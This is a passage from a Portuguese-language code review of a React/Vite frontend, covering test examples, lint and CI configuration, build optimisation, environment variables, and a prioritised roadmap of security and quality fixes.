        const { result } = renderHook(() => useUserForm({ open: true }));
        
        await act(async () => {
            result.current.form.setValue('username', '');
        });
        
        const errors = result.current.form.formState.errors;
        expect(errors.username).toBeDefined();
    });
});
```

**5. Criar Testes de API**

```typescript
// src/features/users/__tests__/usersApi.test.ts
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { usersApi } from '../api';
import { createMockAxios } from '@/test/mocks/axios';

describe('usersApi', () => {
    beforeEach(() => {
        vi.clearAllMocks();
    });

    it('should list users', async () => {
        const mockApi = createMockAxios();
        mockApi.get.mockResolvedValue({
            data: {
                count: 1,
                results: [{ id: 1, username: 'test' }],
            },
        });

        const response = await usersApi.list();
        expect(response.data.results).toHaveLength(1);
    });
});
```

**6. Configurar Prettier**

```javascript
// .prettierrc
{
    "semi": true,
    "singleQuote": true,
    "tabWidth": 4,
    "trailingComma": "es5",
    "printWidth": 100,
    "arrowParens": "always"
}
```

**7. Configurar ESLint Mais Rigoroso**

```javascript
// eslint.config.js
export default tseslint.config(
    { ignores: ["dist"] },
    {
        extends: [js.configs.recommended, ...tseslint.configs.strict],
        files: ["**/*.{ts,tsx}"],
        rules: {
            ...reactHooks.configs.recommended.rules,
            "react-refresh/only-export-components": "warn",
            "@typescript-eslint/no-unused-vars": "error",  // ✅ Agora erro
            "@typescript-eslint/no-explicit-any": "error",
            "@typescript-eslint/explicit-function-return-types": "error",
            "no-console": ["warn", { allow: ["warn", "error"] }],
        },
    },
);
```

**8. Adicionar Playwright para E2E**

```typescript
// playwright.config.ts
export default defineConfig({
    testDir: './e2e',
    webServer: {
        command: 'npm run dev',
        port: 8080,
    },
});

// e2e/auth.spec.ts
import { test, expect } from '@playwright/test';

test('should login and redirect to dashboard', async ({ page }) => {
    await page.goto('http://localhost:8080/login');
    await page.fill('input[name="username"]', 'testuser');
    await page.fill('input[name="password"]', 'password123');
    await page.click('button[type="submit"]');
    await expect(page).toHaveURL('http://localhost:8080/dashboard');
});
```

**9. Adicionar CI/CD com GitHub Actions**

```yaml
# .github/workflows/test.yml
name: Tests

on: [push, pull_request]

jobs:
    test:
        runs-on: ubuntu-latest
        steps:
            - uses: actions/checkout@v3
            - uses: actions/setup-node@v3
              with:
                  node-version: '18'
            - run: npm ci
            - run: npm run lint
            - run: npm run test
            - run: npm run build
```

---

## 8️⃣ CONFIGURAÇÃO E BUILD

### ✅ Pontos Positivos

#### A. Vite Bem Configurado
```typescript
// vite.config.ts
export default defineConfig(() => ({
    server: {
        host: "::",
        port: 8080,
        hmr: {
            overlay: false,  // ✅ Não mostra overlay de erro
        },
    },
    plugins: [react()],  # ✅ React Fast Refresh
    resolve: {
        alias: {
            "@": path.resolve(__dirname, "./src"),  # ✅ Path alias
        },
    },
}));
```
- ✅ HMR customizado
- ✅ Path alias para imports limpos
- ✅ Port definido

#### B. TypeScript Configurado (Mas Leniente)
```json
{
    "canister": {
        "path": "./tsconfig.app.json"
    },
    "references": [
        { "path": "./tsconfig.app.json" },
        { "path": "./tsconfig.node.json" }
    ]
}
```
- ✅ Separação app/node configs
- ✅ Path aliases

#### C. Tailwind + PostCSS Integrados
```javascript
// tailwind.config.ts - Bem estruturado com cores customizadas
// postcss.config.js - Configuração simples e clara
```

#### D. Package.json Com Scripts Claros
```json
{
    "scripts": {
        "dev": "vite",
        "build": "vite build",
        "build:dev": "vite build --mode development",
        "lint": "eslint .",
        "preview": "vite preview",
        "test": "vitest run",
        "test:watch": "vitest"
    }
}
```
- ✅ Scripts essenciais
- ✅ Build com modo dev disponível

#### E. Dependências Bem Estruturadas
```json
{
    "dependencies": {
        "@tanstack/react-query": "^5.83.0",      // ✅ Query client
        "axios": "^1.13.6",                       // ✅ HTTP
        "react": "^18.3.1",                       // ✅ React 18
        "react-hook-form": "^7.61.1",            // ✅ Forms
        "react-router-dom": "^6.30.1",           // ✅ Routing
        "recharts": "^2.15.4",                   // ✅ Gráficos
        "zod": "^3.25.76",                       // ✅ Validação
        "sonner": "^1.7.4"                       // ✅ Toasts
    },
    "devDependencies": {
        "@vitejs/plugin-react": "^6.0.0",
        "@testing-library/react": "^16.0.0",
        "vitest": "^4.1.0",
        "typescript": "^5.8.3"
    }
}
```

### ⚠️ Inconsistências

#### A. Falta Variáveis de Ambiente Documentadas
```typescript
// ❌ Sem .env.example
// ❌ Sem validação de schema
```

#### B. Build Output Não Otimizado
```typescript
// ❌ Sem configuração de código splitting adicional
// ❌ Sem sourcemaps controla do
```

### ❌ Problemas

#### A. Sem .env.example
```bash
# ❌ Não existe .env.example
# Novos devs não sabem quais variáveis são necessárias
```

#### B. Sem Configuração de Proxy para Desenvolvimento
```typescript
// ❌ proxy não configurado em vite.config.ts
// Requisições precisam de porta explícita
```

#### C. Sem Otimização de Bundle
```typescript
// ❌ Sem rollup config customizado
// ❌ Sem splitting de vendor
```

### ✅ Pontos Positivos de Build

- ✅ Vite build otimizado
- ✅ Tree-shaking automático
- ✅ Source maps em dev

### 💡 Recomendações

**1. Criar .env.example**

```bash
# .env.example
VITE_API_BASE_URL=http://localhost:8000
VITE_APP_NAME=Automations Monitor
VITE_LOG_LEVEL=debug
```

**2. Validar Variáveis de Ambiente**

```typescript
// lib/env.ts
import { z } from 'zod';

const envSchema = z.object({
    VITE_API_BASE_URL: z.string().url('API URL inválida'),
    VITE_APP_NAME: z.string().optional(),
    VITE_LOG_LEVEL: z.enum(['debug', 'info', 'warn', 'error']).default('info'),
});

export const env = envSchema.parse(import.meta.env);
```

**3. Setup Proxy em Vite (Dev)**

```typescript
// vite.config.ts
export default defineConfig(() => ({
    server: {
        proxy: {
            '/api': {
                target: 'http://localhost:8000',
                changeOrigin: true,
                // Não reescreve /api em requests
            },
        },
    },
}));
```

**4. Otimizar Build com Rollup Config**

```typescript
// vite.config.ts
export default defineConfig(() => ({
    build: {
        rollupOptions: {
            output: {
                manualChunks: (id) => {
                    if (id.includes('node_modules')) {
                        if (id.includes('@tanstack/react-query')) {
                            return '@tanstack-react-query';
                        }
                        if (id.includes('react-hook-form')) {
                            return 'react-hook-form';
                        }
                        return 'vendor';
                    }
                },
            },
        },
    },
}));
```

**5. Gerar Build Report**

```bash
npm install -D vite-plugin-visualizer

# vite.config.ts
import { visualizer } from 'vite-plugin-visualizer';

plugins: [
    react(),
    visualizer(),
]
```

**6. Adicionar Healthcheck de Build**

```json
{
    "scripts": {
        "build": "vite build && npm run build:check",
        "build:check": "node scripts/build-check.js"
    }
}
```

```javascript
// scripts/build-check.js
const fs = require('fs');
const path = require('path');

const distDir = path.join(__dirname, '../dist');
const files = fs.readdirSync(distDir);

const totalSize = files.reduce((acc, file) => {
    const filepath = path.join(distDir, file);
    return acc + fs.statSync(filepath).size;
}, 0);

const sizeMB = (totalSize / 1024 / 1024).toFixed(2);
console.log(`📦 Build size: ${sizeMB}MB`);

if (sizeMB > 2) {
    console.warn('⚠️  Build size is larger than 2MB');
}
```

---

## 📈 TABELA COMPARATIVA DE PROBLEMAS E RISCOS

| Severidade | Categoria | Problema | Impacto | Recomendação |
|-----------|-----------|----------|--------|--------------|
| 🔴 CRÍTICA | Segurança | localStorage para tokens | XSS vulnerável | Usar HttpOnly cookies |
| 🔴 CRÍTICA | Segurança | Sem HTTPS/CSP/CORS | Injeção de código | Configurar security headers |
| 🔴 CRÍTICA | Testes | 0% cobertura de testes | Bugs em produção | Implementar suite de testes |
| 🟡 ALTA | TypeScript | strictNullChecks=false | Bugs de tipo | Ativar strict mode |
| 🟡 ALTA | Performance | useCallback/useMemo inconsistentes | Re-renders desnecessários | Aplicar padrão |
| 🟡 ALTA | Error Handling | Erros silenciosos | Debugging difícil | Implementar logging |
| 🟡 MÉDIA | Código | CustomEvent pattern | Difícil de testar | Usar Event Emitter |
| 🟢 BAIXA | Estrutura | Inconsistência de hooks | Confusão para novos devs | Padronizar structure |
| 🟢 BAIXA | Docs | Sem ARCHITECTURE.md | Onboarding lento | Documentar padrões |

---

## 🎯 ROADMAP DE CORREÇÕES (Priorizado)

### Fase 1: CRÍTICA (1-2 semanas)
- [ ] Migrar tokens para HttpOnly cookies
- [ ] Ativar TypeScript strict mode
- [ ] Configurar security headers (HTTPS, CSP, CORS)
- [ ] Criar plano de testes

### Fase 2: ALTA (2-4 semanas)
- [ ] Implementar testes unitários core (auth, forms, hooks)
- [ ] Standardizar useCallback/useMemo
- [ ] Setup CI/CD com GitHub Actions
- [ ] Criar documentação de arquitetura

### Fase 3: MÉDIA (1 mês)
- [ ] Implementar testes de integração
- [ ] Substituir CustomEvent por pattern mais testável
- [ ] Criar Zustand store para UI state
- [ ] Validação de variáveis de ambiente

### Fase 4: MANUTENÇÃO (Contínuo)
- [ ] E2E com Playwright
- [ ] Monitoramento de performance
- [ ] Cobertura de testes > 80%
- [ ] Atualizar dependências regularmente

---

## ✅ CHECKLIST DE IMPLEMENTAÇÃO

### Segurança
- [ ] Migrar para HttpOnly cookies (backend + frontend)
- [ ] Adicionar HTTPS redirection
- [ ] Configurar CORS whitelist
- [ ] Implementar CSP headers
- [ ] CSRF token validation
- [ ] Rate limiting na API
- [ ] Validar inputs em Zod parser

### Performance
- [ ] Memoizar todos os filtros com useMemo
- [ ] Aplicar useCallback em handlers
- [ ] Adicionar React.memo em componentes puros
- [ ] Implementar Debounce/Throttle
- [ ] Virtual scrolling para listas grandes
- [ ] Lazy load imagens

### Código
- [ ] Ativar TypeScript strict mode
- [ ] Padronizar structure de features
- [ ] Setup ESLint strict
- [ ] Configurar Prettier
- [ ] Criar type guards
- [ ] Validar env variables

### Testes
- [ ] Tests unitários (auth, forms, utils) - 60%
- [ ] Testes de integração (API, flows) - 20%
- [ ] E2E Playwright - 20%
- [ ] Coverage > 80%

### Documentação
- [ ] ARCHITECTURE.md
- [ ] Guia de setup local
- [ ] Padrões de contribuição
- [ ] API integration guide
- [ ] Security policy

---

## 📞 CONCLUSÕES FINAIS

### Pontos Fortes
✅ Estrutura modular bem pensada  
✅ Lazy loading de páginas implementado  
✅ React Query para cache e syncing  
✅ React Hook Form + Zod para validação  
✅ Error boundaries para resilência  
✅ API service layer bem organizado  

### Pontos Fracos
❌ **Segurança crítica:** tokens em localStorage  
❌ **Sem testes:** 0% cobertura  
❌ **TypeScript leniente:** strictNullChecks = false  
❌ **Documentação:** sem ARCHITECTURE.md  
❌ **Performance:** useCallback/useMemo inconsistentes  

### Recomendação Final
**Status: PRONTO PARA PRODUÇÃO COM RESSALVAS**

O projeto é bem estruturado, mas tem **vulnerabilidades críticas de segurança** que precisam ser endereçadas ANTES de ir para produção. A falta de testes também é preocupante para maintainability.

**Sugestão:** Implementar Fase 1 (crítica) antes de qualquer deploy.
